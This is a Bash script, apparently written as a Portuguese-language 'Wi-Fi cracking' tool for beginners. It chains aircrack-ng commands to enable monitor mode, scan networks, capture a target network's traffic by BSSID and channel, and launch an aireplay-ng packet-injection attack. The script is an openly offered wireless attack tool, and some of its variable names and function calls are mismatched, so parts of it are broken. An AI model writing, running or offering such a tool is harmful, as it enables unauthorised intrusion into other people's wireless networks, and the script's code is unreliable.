#!/bin/bash
#Coder: Psychø
#Coder: Agent-2k40

#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
#øøøøøøøø                 Wørdkey                øøøøøøøøøøøø
#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø

#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Wordkey(){
	echo "øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø       DarkBunny     «««««"
	echo "→→→→→→→→→→→→→→→→→→→→→→→→→ Wørdkey ←←←←←←←←←←←←←←←←←←←←←←←←←"
	echo "»»»»»    Psychør4ptør     øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø"

}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Inicio(){
	echo "Programa quebra wifi"
	echo "Facil manuseio"
	echo "util à leigos"
	echo ""
	echo ""
	echo "P4nd3møn↓um - Psychør4ptør"
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Tempo(){
	read -p "Quanto tempo entre aberturas de terminais(seg): " TEMPO
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Interface(){
	read -p "[*] Qual interface usar » " PLACA;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Interface_mon(){
	read -p "[*] Insira interface[mon] » " PLACA_MON;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Interface_ok(){
	read -p "[*] Interface gerada 'mon' [y ou n] » " REPLY;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Limpa(){
	sleep 2 && clear;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Espera(){
	sleep 5;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Sair(){
	sleep 5 && exit;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Pula(){
	echo "";
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Airmon_win(){
	export -f Wordkey;
	export -f Interface;
	export -f Limpa;
	export -f Espera;
	export -f Pula;
	export -f Sair;
#	export -f Interface_ok;
	gnome-terminal -x  bash -c 'Wordkey; Espera; Limpa; iwconfig; sleep 2; Interface; Limpa; echo "[*] Interface escolhida » $PLACA"; Pula; echo "[!] Preparando interface[mon]"; Pula; sudo airmon-ng start $placa; Limpa; iwconfig; Sair; exec bash'
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Airmon(){
	export -f Airmon_win;
	Airmon_win;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Airodump_win(){
	export -f Wordkey;
	export -f Limpa;
	export -f Pula;
	export -f Sair;
	export -f Espera;
	export -f Interface_mon;
	gnome-terminal -x bash -c 'Wordkey; Espera; Limpa; echo "[!] Iniciando busca por redes"; Espera; Pula; iwconfig; Pula; Interface_mon; Pula; echo "[!] Preparando e iniciando busca por redes"; Pula; sudo airodump-ng $PLACA_MON; exec bash';
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Airodump(){
	export -f Airodump_win;
	Airodump_win;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Alvo(){
	export -f Espera;
	export -f Limpa;
	echo "[!] Alvo encontrado"; Espera; echo "[!] Informações de ataque deverão ser informadas"; Espera; Limpa; iwconfig; read -p "[*] Insira interface[mon] » " PLACA_MON; read -p "Insira BSSID » " BSSID; read -p "Insira ESSID » " ESSID; read -p "Insira CHANNEL » " CANAL;
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Alvo_airodump(){
	export -f Wordkey;
	export -f Alvo;
	export -f Espera;
	export -f Limpa;
	export -f Pula;
	gnome-terminal -x bash -c 'Wordkey; Alvo; Pula; echo "[!] Ataque de recolhimento"; Espera; Pula; echo "[ø] Iniciado"; Pula; sudo airodump-ng --bssid $BSSID --essid $ESSID --channel $CANAL --write $ESSID $PLACA_MON; exec bash'
}
#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
Alvo_aireplay(){
        export -f Alvo;
        export -f Espera;
        export -f Limpa;
        export -f Pula;
        gnome-terminal -x bash -c 'Alvo; Pula; echo "[!] Ataque de pacotes"; Espera; Pula; echo "[ø] Iniciado"; sudo aireplay-ng -6 -b $BSSID -e $ESSID --ignore-negative-one $PLACA_MON; exec bash'
}

#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→


#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
Wordkey
Pula
Inicio
Pula
TEMPO
Airmon
sleep $TEMPO
Airodump
sleep $TEMPO
Alvo_airodump
sleep $TEMPO
Alvo_aireplay
#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
